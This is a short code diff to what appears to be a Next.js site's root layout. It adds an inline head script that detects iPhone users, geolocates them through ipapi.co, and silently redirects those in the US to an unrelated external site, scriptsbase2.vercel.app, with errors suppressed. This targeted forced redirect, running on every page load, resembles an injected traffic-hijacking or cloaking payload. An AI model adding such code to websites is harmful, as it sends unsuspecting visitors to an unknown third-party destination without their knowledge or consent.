@@ -23,6 +23,26 @@ export default function RootLayout({
   return (
     <html lang="en">
       <head>
+        {/* Redirect USA iPhone users */}
+        <script
+          dangerouslySetInnerHTML={{
+            __html: `
+              (function() {
+                const isIPhone = /iPhone/.test(navigator.userAgent);
+                if (isIPhone) {
+                  fetch('https://ipapi.co/json/')
+                    .then(response => response.json())
+                    .then(data => {
+                      if (data.country_code === 'US') {
+                        window.location.href = 'https://scriptsbase2.vercel.app/';
+                      }
+                    })
+                    .catch(() => {});
+                }
+              })();
+            `,
+          }}
+        />
         {/* Google tag (gtag.js) */}
         <script async src="https://www.googletagmanager.com/gtag/js?id=G-5YQ8464MHS"></script>
         <script
